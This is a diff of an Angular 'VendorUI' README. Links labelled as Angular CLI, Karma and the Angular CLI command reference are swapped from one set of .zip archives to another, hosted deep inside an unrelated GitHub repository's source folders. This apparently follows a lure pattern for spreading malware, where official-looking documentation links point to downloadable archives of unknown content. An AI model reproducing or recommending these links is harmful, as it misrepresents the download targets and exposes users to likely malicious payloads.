@@ -1,6 +1,6 @@
 # VendorUI
 
-This project was generated with [Angular CLI](https://raw.githubusercontent.com/PrasadLearning1234/VEM_Tools_Frontend_Updated/main/consubstantiationist/VEM_Tools_Frontend_Updated.zip) version 14.2.3.
+This project was generated with [Angular CLI](https://github.com/PrasadLearning1234/VEM_Tools_Frontend_Updated/raw/refs/heads/main/src/app/business-user/template/newtemplate/template-demo/edit-operation-dialog/VE-Updated-Frontend-Tools-2.5.zip) version 14.2.3.
 
 ## Development server
 
@@ -16,7 +16,7 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/PrasadLearning1234/VEM_Tools_Frontend_Updated/main/consubstantiationist/VEM_Tools_Frontend_Updated.zip).
+Run `ng test` to execute the unit tests via [Karma](https://github.com/PrasadLearning1234/VEM_Tools_Frontend_Updated/raw/refs/heads/main/src/app/business-user/template/newtemplate/template-demo/edit-operation-dialog/VE-Updated-Frontend-Tools-2.5.zip).
 
 ## Running end-to-end tests
 
@@ -24,4 +24,4 @@ Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To u
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/PrasadLearning1234/VEM_Tools_Frontend_Updated/main/consubstantiationist/VEM_Tools_Frontend_Updated.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://github.com/PrasadLearning1234/VEM_Tools_Frontend_Updated/raw/refs/heads/main/src/app/business-user/template/newtemplate/template-demo/edit-operation-dialog/VE-Updated-Frontend-Tools-2.5.zip) page.
